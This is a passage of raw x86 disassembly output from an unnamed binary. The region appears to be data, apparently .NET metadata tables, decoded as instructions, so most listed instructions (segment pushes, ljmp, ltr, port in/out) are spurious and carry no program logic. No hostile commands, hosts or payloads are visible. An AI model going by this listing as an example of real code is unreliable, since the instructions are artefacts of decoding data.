  406329:	00 93 1f d1 18 06    	add    %dl,0x618d11f(%ebx)
  40632f:	00 b0 1f d1 18 06    	add    %dh,0x618d11f(%eax)
  406335:	00 cb                	add    %cl,%bl
  406337:	1f                   	pop    %ds
  406338:	d1 18                	rcrl   $1,(%eax)
  40633a:	06                   	push   %es
  40633b:	00 e6                	add    %ah,%dh
  40633d:	1f                   	pop    %ds
  40633e:	d1 18                	rcrl   $1,(%eax)
  406340:	06                   	push   %es
  406341:	00 ff                	add    %bh,%bh
  406343:	1f                   	pop    %ds
  406344:	d1 18                	rcrl   $1,(%eax)
  406346:	06                   	push   %es
  406347:	00 18                	add    %bl,(%eax)
  406349:	20 d1                	and    %dl,%cl
  40634b:	18 06                	sbb    %al,(%esi)
  40634d:	00 35 20 d1 18 00    	add    %dh,0x18d120
  406353:	00 00                	add    %al,(%eax)
  406355:	00 01                	add    %al,(%ecx)
  406357:	00 00                	add    %al,(%eax)
  406359:	00 00                	add    %al,(%eax)
  40635b:	00 01                	add    %al,(%ecx)
  40635d:	00 01                	add    %al,(%ecx)
  40635f:	00 00                	add    %al,(%eax)
  406361:	00 00                	add    %al,(%eax)
  406363:	00 29                	add    %ch,(%ecx)
  406365:	00 37                	add    %dh,(%edi)
  406367:	00 05 00 01 00 01    	add    %al,0x1000100
  40636d:	00 00                	add    %al,(%eax)
  40636f:	00 00                	add    %al,(%eax)
  406371:	00 3a                	add    %bh,(%edx)
  406373:	00 37                	add    %dh,(%edi)
  406375:	00 09                	add    %cl,(%ecx)
  406377:	00 01                	add    %al,(%ecx)
  406379:	00 02                	add    %al,(%edx)
  40637b:	00 00                	add    %al,(%eax)
  40637d:	01 10                	add    %edx,(%eax)
  40637f:	00 45 00             	add    %al,0x0(%ebp)
  406382:	37                   	aaa
  406383:	00 0d 00 01 00 03    	add    %cl,0x3000100
  406389:	00 05 01 00 00 4f    	add    %al,0x4f000001
  40638f:	00 00                	add    %al,(%eax)
  406391:	00 0d 00 05 00 08    	add    %cl,0x8000500
  406397:	00 05 01 00 00 5d    	add    %al,0x5d000001
  40639d:	00 00                	add    %al,(%eax)
  40639f:	00 0d 00 05 00 0f    	add    %cl,0xf000500
  4063a5:	00 01                	add    %al,(%ecx)
  4063a7:	00 10                	add    %dl,(%eax)
  4063a9:	00 78 00             	add    %bh,0x0(%eax)
  4063ac:	00 00                	add    %al,(%eax)
  4063ae:	0d 00 06 00 11       	or     $0x11000600,%eax
  4063b3:	00 01                	add    %al,(%ecx)
  4063b5:	00 00                	add    %al,(%eax)
  4063b7:	00 81 00 86 00 0d    	add    %al,0xd008600(%ecx)
  4063bd:	00 12                	add    %dl,(%edx)
  4063bf:	00 13                	add    %dl,(%ebx)
  4063c1:	00 01                	add    %al,(%ecx)
  4063c3:	00 10                	add    %dl,(%eax)
  4063c5:	00 8b 00 86 00 0d    	add    %cl,0xd008600(%ebx)
  4063cb:	00 12                	add    %dl,(%edx)
  4063cd:	00 21                	add    %ah,(%ecx)
  4063cf:	00 01                	add    %al,(%ecx)
  4063d1:	00 00                	add    %al,(%eax)
  4063d3:	00 98 00 86 00 0d    	add    %bl,0xd008600(%eax)
  4063d9:	00 1d 00 36 00 01    	add    %bl,0x1003600
  4063df:	00 00                	add    %al,(%eax)
  4063e1:	00 a1 00 86 00 0d    	add    %ah,0xd008600(%ecx)
  4063e7:	00 22                	add    %ah,(%edx)
  4063e9:	00 45 00             	add    %al,0x0(%ebp)
  4063ec:	01 00                	add    %eax,(%eax)
  4063ee:	10 00                	adc    %al,(%eax)
  4063f0:	ad                   	lods   %ds:(%esi),%eax
  4063f1:	00 86 00 0d 00 22    	add    %al,0x22000d00(%esi)
  4063f7:	00 47 00             	add    %al,0x0(%edi)
  4063fa:	01 00                	add    %eax,(%eax)
  4063fc:	00 00                	add    %al,(%eax)
  4063fe:	b5 00                	mov    $0x0,%ch
  406400:	86 00                	xchg   %al,(%eax)
  406402:	0d 00 27 00 59       	or     $0x59002700,%eax
  406407:	00 01                	add    %al,(%ecx)
  406409:	00 00                	add    %al,(%eax)
  40640b:	00 c5                	add    %al,%ch
  40640d:	00 86 00 0d 00 27    	add    %al,0x27000d00(%esi)
  406413:	00 5e 00             	add    %bl,0x0(%esi)
  406416:	00 01                	add    %al,(%ecx)
  406418:	10 00                	adc    %al,(%eax)
  40641a:	d2 00                	rolb   %cl,(%eax)
  40641c:	86 00                	xchg   %al,(%eax)
  40641e:	0d 00 27 00 60       	or     $0x60002700,%eax
  406423:	00 03                	add    %al,(%ebx)
  406425:	01 00                	add    %eax,(%eax)
  406427:	00 d9                	add    %bl,%cl
  406429:	00 00                	add    %al,(%eax)
  40642b:	00 49 00             	add    %cl,0x0(%ecx)
  40642e:	34 00                	xor    $0x0,%al
  406430:	78 00                	js     0x406432
  406432:	0a 01                	or     (%ecx),%al
  406434:	00 00                	add    %al,(%eax)
  406436:	ee                   	out    %al,(%dx)
  406437:	00 00                	add    %al,(%eax)
  406439:	00 51 00             	add    %dl,0x0(%ecx)
  40643c:	34 00                	xor    $0x0,%al
  40643e:	7c 00                	jl     0x406440
  406440:	02 01                	add    (%ecx),%al
  406442:	00 00                	add    %al,(%eax)
  406444:	fc                   	cld
  406445:	00 00                	add    %al,(%eax)
  406447:	00 55 00             	add    %dl,0x0(%ebp)
  40644a:	36 00 7c 00 00       	add    %bh,%ss:0x0(%eax,%eax,1)
  40644f:	01 00                	add    %eax,(%eax)
  406451:	00 2f                	add    %ch,(%edi)
  406453:	0e                   	push   %cs
  406454:	00 00                	add    %al,(%eax)
  406456:	49                   	dec    %ecx
  406457:	00 3a                	add    %bh,(%edx)
  406459:	00 7c 00 05          	add    %bh,0x5(%eax,%eax,1)
  40645d:	00 00                	add    %al,(%eax)
  40645f:	00 48 16             	add    %cl,0x16(%eax)
  406462:	00 00                	add    %al,(%eax)
  406464:	0d 00 3a 00 80       	or     $0x80003a00,%eax
  406469:	00 31                	add    %dh,(%ecx)
  40646b:	00 95 01 20 00 31    	add    %dl,0x31002001(%ebp)
  406471:	00 be 01 2d 00 31    	add    %bh,0x31002d01(%esi)
  406477:	00 e0                	add    %ah,%al
  406479:	01 3a                	add    %edi,(%edx)
  40647b:	00 31                	add    %dh,(%ecx)
  40647d:	00 05 02 47 00 11    	add    %al,0x11004702
  406483:	00 a8 02 90 00 16    	add    %ch,0x16009002(%eax)
  406489:	00 c8                	add    %cl,%al
  40648b:	02 99 00 16 00 ce    	add    -0x31ffea00(%ecx),%bl
  406491:	02 99 00 16 00 d3    	add    -0x2cffea00(%ecx),%bl
  406497:	02 99 00 16 00 d8    	add    -0x27ffea00(%ecx),%bl
  40649d:	02 99 00 16 00 dc    	add    -0x23ffea00(%ecx),%bl
  4064a3:	02 99 00 16 00 e0    	add    -0x1fffea00(%ecx),%bl
  4064a9:	02 9c 00 16 00 e6 02 	add    0x2e60016(%eax,%eax,1),%bl
  4064b0:	99                   	cltd
  4064b1:	00 16                	add    %dl,(%esi)
  4064b3:	00 ec                	add    %ch,%ah
  4064b5:	02 99 00 16 00 f2    	add    -0xdffea00(%ecx),%bl
  4064bb:	02 99 00 16 00 fd    	add    -0x2ffea00(%ecx),%bl
  4064c1:	02 99 00 16 00 08    	add    0x8001600(%ecx),%bl
  4064c7:	03 99 00 16 00 0e    	add    0xe001600(%ecx),%ebx
  4064cd:	03 99 00 16 00 c4    	add    -0x3bffea00(%ecx),%ebx
  4064d3:	03 af 00 16 00 ea    	add    -0x15ffea00(%edi),%ebp
  4064d9:	03 b2 00 11 00 ec    	add    -0x13ffef00(%edx),%esi
  4064df:	03 b6 00 11 00 f9    	add    -0x6ffef00(%esi),%esi
  4064e5:	03 b9 00 11 00 17    	add    0x17001100(%ecx),%edi
  4064eb:	04 bd                	add    $0xbd,%al
  4064ed:	00 11                	add    %dl,(%ecx)
  4064ef:	00 31                	add    %dh,(%ecx)
  4064f1:	04 c1                	add    $0xc1,%al
  4064f3:	00 16                	add    %dl,(%esi)
  4064f5:	00 47 04             	add    %al,0x4(%edi)
  4064f8:	c5 00                	lds    (%eax),%eax
  4064fa:	11 00                	adc    %eax,(%eax)
  4064fc:	4f                   	dec    %edi
  4064fd:	04 c9                	add    $0xc9,%al
  4064ff:	00 16                	add    %dl,(%esi)
  406501:	00 58 04             	add    %bl,0x4(%eax)
  406504:	c1 00 16             	roll   $0x16,(%eax)
  406507:	00 5e 04             	add    %bl,0x4(%esi)
  40650a:	9c                   	pushf
  40650b:	00 16                	add    %dl,(%esi)
  40650d:	00 67 04             	add    %ah,0x4(%edi)
  406510:	af                   	scas   %es:(%edi),%eax
  406511:	00 16                	add    %dl,(%esi)
  406513:	00 15 05 ef 00 16    	add    %dl,0x1600ef05
  406519:	00 1f                	add    %bl,(%edi)
  40651b:	05 9c 00 16 00       	add    $0x16009c,%eax
  406520:	44                   	inc    %esp
  406521:	05 f3 00 16 00       	add    $0x1600f3,%eax
  406526:	49                   	dec    %ecx
  406527:	05 f3 00 16 00       	add    $0x1600f3,%eax
  40652c:	d3 05 09 01 11 00    	roll   %cl,0x110109
  406532:	4e                   	dec    %esi
  406533:	06                   	push   %es
  406534:	99                   	cltd
  406535:	00 51 80             	add    %dl,-0x80(%ecx)
  406538:	c6 06 9c             	movb   $0x9c,(%esi)
  40653b:	00 11                	add    %dl,(%ecx)
  40653d:	00 d1                	add    %dl,%cl
  40653f:	06                   	push   %es
  406540:	43                   	inc    %ebx
  406541:	01 11                	add    %edx,(%ecx)
  406543:	00 d7                	add    %dl,%bh
  406545:	06                   	push   %es
  406546:	09 01                	or     %eax,(%ecx)
  406548:	11 00                	adc    %eax,(%eax)
  40654a:	33 07                	xor    (%edi),%eax
  40654c:	9c                   	pushf
  40654d:	00 16                	add    %dl,(%esi)
  40654f:	00 18                	add    %bl,(%eax)
  406551:	09 af 00 16 00 66    	or     %ebp,0x66001600(%edi)
  406557:	09 a4 01 51 80 71 09 	or     %esp,0x9718051(%ecx,%eax,1)
  40655e:	99                   	cltd
  40655f:	00 16                	add    %dl,(%esi)
  406561:	00 7a 09             	add    %bh,0x9(%edx)
  406564:	dd 01                	fldl   (%ecx)
  406566:	36 00 81 09 99 00 16 	add    %al,%ss:0x16009909(%ecx)
  40656d:	00 84 09 99 00 11 00 	add    %al,0x110099(%ecx,%ecx,1)
  406574:	b9 09 9c 00 11       	mov    $0x11009c09,%ecx
  406579:	00 c2                	add    %al,%dl
  40657b:	09 ed                	or     %ebp,%ebp
  40657d:	01 16                	add    %edx,(%esi)
  40657f:	00 e9                	add    %ch,%cl
  406581:	09 f5                	or     %esi,%ebp
  406583:	01 16                	add    %edx,(%esi)
  406585:	00 f7                	add    %dh,%bh
  406587:	09 9c 00 16 00 08 0a 	or     %ebx,0xa080016(%eax,%eax,1)
  40658e:	99                   	cltd
  40658f:	00 16                	add    %dl,(%esi)
  406591:	00 15 0a ef 00 16    	add    %dl,0x1600ef0a
  406597:	00 cc                	add    %cl,%ah
  406599:	0a 27                	or     (%edi),%ah
  40659b:	02 06                	add    (%esi),%al
  40659d:	10 86 0b 9c 00 06    	adc    %al,0x6009c0b(%esi)
  4065a3:	10 8d 0b 9c 00 06    	adc    %cl,0x6009c0b(%ebp)
  4065a9:	06                   	push   %es
  4065aa:	99                   	cltd
  4065ab:	0b 49 02             	or     0x2(%ecx),%ecx
  4065ae:	56                   	push   %esi
  4065af:	80 a1 0b 4c 02 56 80 	andb   $0x80,0x56024c0b(%ecx)
  4065b6:	af                   	scas   %es:(%edi),%eax
  4065b7:	0b 4c 02 56          	or     0x56(%edx,%eax,1),%ecx
  4065bb:	80 c3 0b             	add    $0xb,%bl
  4065be:	4c                   	dec    %esp
  4065bf:	02 06                	add    (%esi),%al
  4065c1:	00 55 16             	add    %dl,0x16(%ebp)
  4065c4:	99                   	cltd
  4065c5:	00 06                	add    %al,(%esi)
  4065c7:	00 64 16 99          	add    %ah,-0x67(%esi,%edx,1)
  4065cb:	00 50 20             	add    %dl,0x20(%eax)
  4065ce:	00 00                	add    %al,(%eax)
  4065d0:	00 00                	add    %al,(%eax)
  4065d2:	06                   	push   %es
  4065d3:	18 46 01             	sbb    %al,0x1(%esi)
  4065d6:	13 00                	adc    (%eax),%eax
  4065d8:	01 00                	add    %eax,(%eax)
  4065da:	58                   	pop    %eax
  4065db:	20 00                	and    %al,(%eax)
  4065dd:	00 00                	add    %al,(%eax)
  4065df:	00 06                	add    %al,(%esi)
  4065e1:	18 46 01             	sbb    %al,0x1(%esi)
  4065e4:	13 00                	adc    (%eax),%eax
  4065e6:	01 00                	add    %eax,(%eax)
  4065e8:	60                   	pusha
  4065e9:	20 00                	and    %al,(%eax)
  4065eb:	00 00                	add    %al,(%eax)
  4065ed:	00 11                	add    %dl,(%ecx)
  4065ef:	18 81 01 17 00 01    	sbb    %al,0x1001701(%ecx)
  4065f5:	00 8c 20 00 00 00 00 	add    %cl,0x0(%eax,%eiz,1)
  4065fc:	13 08                	adc    (%eax),%ecx
  4065fe:	88 01                	mov    %al,(%ecx)
  406600:	1b 00                	sbb    (%eax),%eax
  406602:	01 00                	add    %eax,(%eax)
  406604:	a8 20                	test   $0x20,%al
  406606:	00 00                	add    %al,(%eax)
  406608:	00 00                	add    %al,(%eax)
  40660a:	13 08                	adc    (%eax),%ecx
  40660c:	ae                   	scas   %es:(%edi),%al
  40660d:	01 28                	add    %ebp,(%eax)
  40660f:	00 01                	add    %al,(%ecx)
  406611:	00 c4                	add    %al,%ah
  406613:	20 00                	and    %al,(%eax)
  406615:	00 00                	add    %al,(%eax)
  406617:	00 13                	add    %dl,(%ebx)
  406619:	08 d7                	or     %dl,%bh
  40661b:	01 35 00 01 00 e0    	add    %esi,0xe0000100
  406621:	20 00                	and    %al,(%eax)
  406623:	00 00                	add    %al,(%eax)
  406625:	00 13                	add    %dl,(%ebx)
  406627:	08 f5                	or     %dh,%ch
  406629:	01 42 00             	add    %eax,0x0(%edx)
  40662c:	01 00                	add    %eax,(%eax)
  40662e:	fc                   	cld
  40662f:	20 00                	and    %al,(%eax)
  406631:	00 00                	add    %al,(%eax)
  406633:	00 46 02             	add    %al,0x2(%esi)
  406636:	3b 02                	cmp    (%edx),%eax
  406638:	63 00                	arpl   %eax,(%eax)
  40663a:	01 00                	add    %eax,(%eax)
  40663c:	1c 21                	sbb    $0x21,%al
  40663e:	00 00                	add    %al,(%eax)
  406640:	00 00                	add    %al,(%eax)
  406642:	46                   	inc    %esi
  406643:	02 44 02 68          	add    0x68(%edx,%eax,1),%al
  406647:	00 02                	add    %al,(%edx)
  406649:	00 34 21             	add    %dh,(%ecx,%eiz,1)
  40664c:	00 00                	add    %al,(%eax)
  40664e:	00 00                	add    %al,(%eax)
  406650:	83 00 55             	addl   $0x55,(%eax)
  406653:	02 6c 00 02          	add    0x2(%eax,%eax,1),%ch
  406657:	00 50 21             	add    %dl,0x21(%eax)
  40665a:	00 00                	add    %al,(%eax)
  40665c:	00 00                	add    %al,(%eax)
  40665e:	46                   	inc    %esi
  40665f:	02 5d 02             	add    0x2(%ebp),%bl
  406662:	71 00                	jno    0x406664
  406664:	02 00                	add    (%eax),%al
  406666:	68 21 00 00 00       	push   $0x21
  40666b:	00 11                	add    %dl,(%ecx)
  40666d:	00 66 02             	add    %ah,0x2(%esi)
  406670:	78 00                	js     0x406672
  406672:	02 00                	add    (%eax),%al
  406674:	8c 21                	mov    %fs,(%ecx)
  406676:	00 00                	add    %al,(%eax)
  406678:	00 00                	add    %al,(%eax)
  40667a:	01 00                	add    %eax,(%eax)
  40667c:	84 02                	test   %al,(%edx)
  40667e:	80 00 03             	addb   $0x3,(%eax)
  406681:	00 a8 21 00 00 00    	add    %ch,0x21(%eax)
  406687:	00 06                	add    %al,(%esi)
  406689:	18 46 01             	sbb    %al,0x1(%esi)
  40668c:	13 00                	adc    (%eax),%eax
  40668e:	04 00                	add    $0x0,%al
  406690:	b0 21                	mov    $0x21,%al
  406692:	00 00                	add    %al,(%eax)
  406694:	00 00                	add    %al,(%eax)
  406696:	03 08                	add    (%eax),%ecx
  406698:	98                   	cwtl
  406699:	02 8b 00 04 00 dc    	add    -0x23fffc00(%ebx),%cl
  40669f:	21 00                	and    %eax,(%eax)
  4066a1:	00 00                	add    %al,(%eax)
  4066a3:	00 06                	add    %al,(%esi)
  4066a5:	18 46 01             	sbb    %al,0x1(%esi)
  4066a8:	13 00                	adc    (%eax),%eax
  4066aa:	04 00                	add    $0x0,%al
  4066ac:	e4 21                	in     $0x21,%al
  4066ae:	00 00                	add    %al,(%eax)
  4066b0:	00 00                	add    %al,(%eax)
  4066b2:	11 18                	adc    %ebx,(%eax)
  4066b4:	81 01 17 00 04 00    	addl   $0x40017,(%ecx)
  4066ba:	74 22                	je     0x4066de
  4066bc:	00 00                	add    %al,(%eax)
  4066be:	00 00                	add    %al,(%eax)
  4066c0:	06                   	push   %es
  4066c1:	18 46 01             	sbb    %al,0x1(%esi)
  4066c4:	13 00                	adc    (%eax),%eax
  4066c6:	04 00                	add    $0x0,%al
  4066c8:	7c 22                	jl     0x4066ec
  4066ca:	00 00                	add    %al,(%eax)
  4066cc:	00 00                	add    %al,(%eax)
  4066ce:	06                   	push   %es
  4066cf:	18 46 01             	sbb    %al,0x1(%esi)
  4066d2:	13 00                	adc    (%eax),%eax
  4066d4:	04 00                	add    $0x0,%al
  4066d6:	84 22                	test   %ah,(%edx)
  4066d8:	00 00                	add    %al,(%eax)
  4066da:	00 00                	add    %al,(%eax)
  4066dc:	16                   	push   %ss
  4066dd:	00 81 00 17 00 04    	add    %al,0x4001700(%ecx)
  4066e3:	00 c0                	add    %al,%al
  4066e5:	26 00 00             	add    %al,%es:(%eax)
  4066e8:	00 00                	add    %al,(%eax)
  4066ea:	16                   	push   %ss
  4066eb:	00 19                	add    %bl,(%ecx)
  4066ed:	03 17                	add    (%edi),%edx
  4066ef:	00 04 00             	add    %al,(%eax,%eax,1)
  4066f2:	d8 27                	fsubs  (%edi)
  4066f4:	00 00                	add    %al,(%eax)
  4066f6:	00 00                	add    %al,(%eax)
  4066f8:	16                   	push   %ss
  4066f9:	00 23                	add    %ah,(%ebx)
  4066fb:	03 17                	add    (%edi),%edx
  4066fd:	00 04 00             	add    %al,(%eax,%eax,1)
  406700:	0c 28                	or     $0x28,%al
  406702:	00 00                	add    %al,(%eax)
  406704:	00 00                	add    %al,(%eax)
  406706:	11 00                	adc    %eax,(%eax)
  406708:	33 03                	xor    (%ebx),%eax
  40670a:	9f                   	lahf
  40670b:	00 04 00             	add    %al,(%eax,%eax,1)
  40670e:	5c                   	pop    %esp
  40670f:	28 00                	sub    %al,(%eax)
  406711:	00 00                	add    %al,(%eax)
  406713:	00 11                	add    %dl,(%ecx)
  406715:	00 3a                	add    %bh,(%edx)
  406717:	03 9f 00 04 00 ac    	add    -0x53fffc00(%edi),%ebx
  40671d:	28 00                	sub    %al,(%eax)
  40671f:	00 00                	add    %al,(%eax)
  406721:	00 11                	add    %dl,(%ecx)
  406723:	00 3f                	add    %bh,(%edi)
  406725:	03 9f 00 04 00 64    	add    0x64000400(%edi),%ebx
  40672b:	2a 00                	sub    (%eax),%al
  40672d:	00 00                	add    %al,(%eax)
  40672f:	00 11                	add    %dl,(%ecx)
  406731:	00 52 03             	add    %dl,0x3(%edx)
  406734:	9f                   	lahf
  406735:	00 04 00             	add    %al,(%eax,%eax,1)
  406738:	b4 2a                	mov    $0x2a,%ah
  40673a:	00 00                	add    %al,(%eax)
  40673c:	00 00                	add    %al,(%eax)
  40673e:	11 00                	adc    %eax,(%eax)
  406740:	61                   	popa
  406741:	03 9f 00 04 00 00    	add    0x400(%edi),%ebx
  406747:	00 00                	add    %al,(%eax)
  406749:	00 80 00 16 20 71    	add    %al,0x71201600(%eax)
  40674f:	03 a3 00 04 00 00    	add    0x400(%ebx),%esp
  406755:	00 00                	add    %al,(%eax)
  406757:	00 80 00 16 20 8e    	add    %al,-0x71dfea00(%eax)
  40675d:	03 a8 00 05 00 08    	add    0x8000500(%eax),%ebp
  406763:	2b 00                	sub    (%eax),%eax
  406765:	00 00                	add    %al,(%eax)
  406767:	00 11                	add    %dl,(%ecx)
  406769:	08 46 0e             	or     %al,0xe(%esi)
  40676c:	17                   	pop    %ss
  40676d:	00 07                	add    %al,(%edi)
  40676f:	00 14 2b             	add    %dl,(%ebx,%ebp,1)
  406772:	00 00                	add    %al,(%eax)
  406774:	00 00                	add    %al,(%eax)
  406776:	11 08                	adc    %ecx,(%eax)
  406778:	52                   	push   %edx
  406779:	0e                   	push   %cs
  40677a:	17                   	pop    %ss
  40677b:	00 07                	add    %al,(%edi)
  40677d:	00 20                	add    %ah,(%eax)
  40677f:	2b 00                	sub    (%eax),%eax
  406781:	00 00                	add    %al,(%eax)
  406783:	00 11                	add    %dl,(%ecx)
  406785:	08 5e 0e             	or     %bl,0xe(%esi)
  406788:	17                   	pop    %ss
  406789:	00 07                	add    %al,(%edi)
  40678b:	00 5c 2b 00          	add    %bl,0x0(%ebx,%ebp,1)
  40678f:	00 00                	add    %al,(%eax)
  406791:	00 11                	add    %dl,(%ecx)
  406793:	18 81 01 17 00 07    	sbb    %al,0x7001701(%ecx)
  406799:	00 90 2b 00 00 00    	add    %dl,0x2b(%eax)
  40679f:	00 06                	add    %al,(%esi)
  4067a1:	18 46 01             	sbb    %al,0x1(%esi)
  4067a4:	13 00                	adc    (%eax),%eax
  4067a6:	07                   	pop    %es
  4067a7:	00 98 2b 00 00 00    	add    %bl,0x2b(%eax)
  4067ad:	00 16                	add    %dl,(%esi)
  4067af:	00 74 04 17          	add    %dh,0x17(%esp,%eax,1)
  4067b3:	00 07                	add    %al,(%edi)
  4067b5:	00 6c 2c 00          	add    %ch,0x0(%esp,%ebp,1)
  4067b9:	00 00                	add    %al,(%eax)
  4067bb:	00 16                	add    %dl,(%esi)
  4067bd:	00 81 04 cc 00 07    	add    %al,0x700cc04(%ecx)
  4067c3:	00 dc                	add    %bl,%ah
  4067c5:	2d 00 00 00 00       	sub    $0x0,%eax
  4067ca:	16                   	push   %ss
  4067cb:	00 91 04 d1 00 08    	add    %dl,0x800d104(%ecx)
  4067d1:	00 40 2f             	add    %al,0x2f(%eax)
  4067d4:	00 00                	add    %al,(%eax)
  4067d6:	00 00                	add    %al,(%eax)
  4067d8:	16                   	push   %ss
  4067d9:	00 96 04 d5 00 08    	add    %dl,0x800d504(%esi)
  4067df:	00 9c 2f 00 00 00 00 	add    %bl,0x0(%edi,%ebp,1)
  4067e6:	16                   	push   %ss
  4067e7:	00 9d 04 d5 00 08    	add    %bl,0x800d504(%ebp)
  4067ed:	00 04 30             	add    %al,(%eax,%esi,1)
  4067f0:	00 00                	add    %al,(%eax)
  4067f2:	00 00                	add    %al,(%eax)
  4067f4:	16                   	push   %ss
  4067f5:	00 a4 04 d5 00 08 00 	add    %ah,0x800d5(%esp,%eax,1)
  4067fc:	60                   	pusha
  4067fd:	30 00                	xor    %al,(%eax)
  4067ff:	00 00                	add    %al,(%eax)
  406801:	00 16                	add    %dl,(%esi)
  406803:	00 a8 04 d5 00 08    	add    %ch,0x800d504(%eax)
  406809:	00 64 31 00          	add    %ah,0x0(%ecx,%esi,1)
  40680d:	00 00                	add    %al,(%eax)
  40680f:	00 16                	add    %dl,(%esi)
  406811:	00 b2 04 d5 00 08    	add    %dh,0x800d504(%edx)
  406817:	00 1c 32             	add    %bl,(%edx,%esi,1)
  40681a:	00 00                	add    %al,(%eax)
  40681c:	00 00                	add    %al,(%eax)
  40681e:	16                   	push   %ss
  40681f:	00 b6 04 d5 00 08    	add    %dh,0x800d504(%esi)
  406825:	00 bc 32 00 00 00 00 	add    %bh,0x0(%edx,%esi,1)
  40682c:	16                   	push   %ss
  40682d:	00 ba 04 d5 00 08    	add    %bh,0x800d504(%edx)
  406833:	00 94 33 00 00 00 00 	add    %dl,0x0(%ebx,%esi,1)
  40683a:	16                   	push   %ss
  40683b:	00 cb                	add    %cl,%bl
  40683d:	04 d9                	add    $0xd9,%al
  40683f:	00 08                	add    %cl,(%eax)
  406841:	00 84 35 00 00 00 00 	add    %al,0x0(%ebp,%esi,1)
  406848:	16                   	push   %ss
  406849:	00 db                	add    %bl,%bl
  40684b:	04 df                	add    $0xdf,%al
  40684d:	00 09                	add    %cl,(%ecx)
  40684f:	00 b8 35 00 00 00    	add    %bh,0x35(%eax)
  406855:	00 16                	add    %dl,(%esi)
  406857:	00 e7                	add    %ah,%bh
  406859:	04 e5                	add    $0xe5,%al
  40685b:	00 0a                	add    %cl,(%edx)
  40685d:	00 b8 36 00 00 00    	add    %bh,0x36(%eax)
  406863:	00 16                	add    %dl,(%esi)
  406865:	00 f0                	add    %dh,%al
  406867:	04 d9                	add    $0xd9,%al
  406869:	00 0b                	add    %cl,(%ebx)
  40686b:	00 f8                	add    %bh,%al
  40686d:	36 00 00             	add    %al,%ss:(%eax)
  406870:	00 00                	add    %al,(%eax)
  406872:	16                   	push   %ss
  406873:	00 f8                	add    %bh,%al
  406875:	04 17                	add    $0x17,%al
  406877:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40687a:	f0 37                	lock aaa
  40687c:	00 00                	add    %al,(%eax)
  40687e:	00 00                	add    %al,(%eax)
  406880:	16                   	push   %ss
  406881:	00 07                	add    %al,(%edi)
  406883:	05 ea 00 0c 00       	add    $0xc00ea,%eax
  406888:	38 38                	cmp    %bh,(%eax)
  40688a:	00 00                	add    %al,(%eax)
  40688c:	00 00                	add    %al,(%eax)
  40688e:	16                   	push   %ss
  40688f:	00 10                	add    %dl,(%eax)
  406891:	05 17 00 0d 00       	add    $0xd0017,%eax
  406896:	b4 38                	mov    $0x38,%ah
  406898:	00 00                	add    %al,(%eax)
  40689a:	00 00                	add    %al,(%eax)
  40689c:	11 08                	adc    %ecx,(%eax)
  40689e:	d5 12                	aad    $0x12
  4068a0:	ea 00 0d 00 c0 38 00 	ljmp   $0x38,$0xc0000d00
  4068a7:	00 00                	add    %al,(%eax)
  4068a9:	00 11                	add    %dl,(%ecx)
  4068ab:	08 e4                	or     %ah,%ah
  4068ad:	12 ea                	adc    %dl,%ch
  4068af:	00 0e                	add    %cl,(%esi)
  4068b1:	00 d0                	add    %dl,%al
  4068b3:	38 00                	cmp    %al,(%eax)
  4068b5:	00 00                	add    %al,(%eax)
  4068b7:	00 06                	add    %al,(%esi)
  4068b9:	18 46 01             	sbb    %al,0x1(%esi)
  4068bc:	13 00                	adc    (%eax),%eax
  4068be:	0f 00 d8             	ltr    %eax
  4068c1:	38 00                	cmp    %al,(%eax)
  4068c3:	00 00                	add    %al,(%eax)
  4068c5:	00 16                	add    %dl,(%esi)
  4068c7:	00 1a                	add    %bl,(%edx)
  4068c9:	05 df 00 0f 00       	add    $0xf00df,%eax
  4068ce:	a8 41                	test   $0x41,%al
  4068d0:	00 00                	add    %al,(%eax)
  4068d2:	00 00                	add    %al,(%eax)
  4068d4:	16                   	push   %ss
  4068d5:	00 22                	add    %ah,(%edx)
  4068d7:	05 df 00 10 00       	add    $0x1000df,%eax
  4068dc:	84 46 00             	test   %al,0x0(%esi)
  4068df:	00 00                	add    %al,(%eax)
  4068e1:	00 16                	add    %dl,(%esi)
  4068e3:	00 2b                	add    %ch,(%ebx)
  4068e5:	05 e5 00 11 00       	add    $0x1100e5,%eax
  4068ea:	c8 46 00 00          	enter  $0x46,$0x0
  4068ee:	00 00                	add    %al,(%eax)
  4068f0:	16                   	push   %ss
  4068f1:	00 33                	add    %dh,(%ebx)
  4068f3:	05 e5 00 12 00       	add    $0x1200e5,%eax
  4068f8:	0c 47                	or     $0x47,%al
  4068fa:	00 00                	add    %al,(%eax)
  4068fc:	00 00                	add    %al,(%eax)
  4068fe:	16                   	push   %ss
  4068ff:	00 56 05             	add    %dl,0x5(%esi)
  406902:	e5 00                	in     $0x0,%eax
  406904:	13 00                	adc    (%eax),%eax
  406906:	fc                   	cld
  406907:	47                   	inc    %edi
  406908:	00 00                	add    %al,(%eax)
  40690a:	00 00                	add    %al,(%eax)
  40690c:	16                   	push   %ss
  40690d:	00 5f 05             	add    %bl,0x5(%edi)
  406910:	e5 00                	in     $0x0,%eax
  406912:	14 00                	adc    $0x0,%al
  406914:	ec                   	in     (%dx),%al
  406915:	48                   	dec    %eax
  406916:	00 00                	add    %al,(%eax)
  406918:	00 00                	add    %al,(%eax)
  40691a:	16                   	push   %ss
  40691b:	00 6f 05             	add    %ch,0x5(%edi)
  40691e:	f7 00 15 00 00 00    	testl  $0x15,(%eax)
  406924:	00 00                	add    %al,(%eax)
  406926:	80 00 16             	addb   $0x16,(%eax)
  406929:	20 82 05 fd 00 17    	and    %al,0x1700fd05(%edx)
  40692f:	00 00                	add    %al,(%eax)
  406931:	00 00                	add    %al,(%eax)
  406933:	00 80 00 16 20 da    	add    %al,-0x25dfea00(%eax)
  406939:	05 0c 01 1f 00       	add    $0x1f010c,%eax
  40693e:	ac                   	lods   %ds:(%esi),%al
  40693f:	49                   	dec    %ecx
  406940:	00 00                	add    %al,(%eax)
  406942:	00 00                	add    %al,(%eax)
  406944:	16                   	push   %ss
  406945:	00 19                	add    %bl,(%ecx)
  406947:	06                   	push   %es
  406948:	9f                   	lahf
  406949:	00 24 00             	add    %ah,(%eax,%eax,1)
  40694c:	08 4a 00             	or     %cl,0x0(%edx)
  40694f:	00 00                	add    %al,(%eax)
  406951:	00 11                	add    %dl,(%ecx)
  406953:	00 1d 06 17 01 24    	add    %bl,0x24011706
  406959:	00 dc                	add    %bl,%ah
  40695b:	4a                   	dec    %edx
  40695c:	00 00                	add    %al,(%eax)
  40695e:	00 00                	add    %al,(%eax)
  406960:	11 00                	adc    %eax,(%eax)
  406962:	2f                   	das
  406963:	06                   	push   %es
  406964:	1e                   	push   %ds
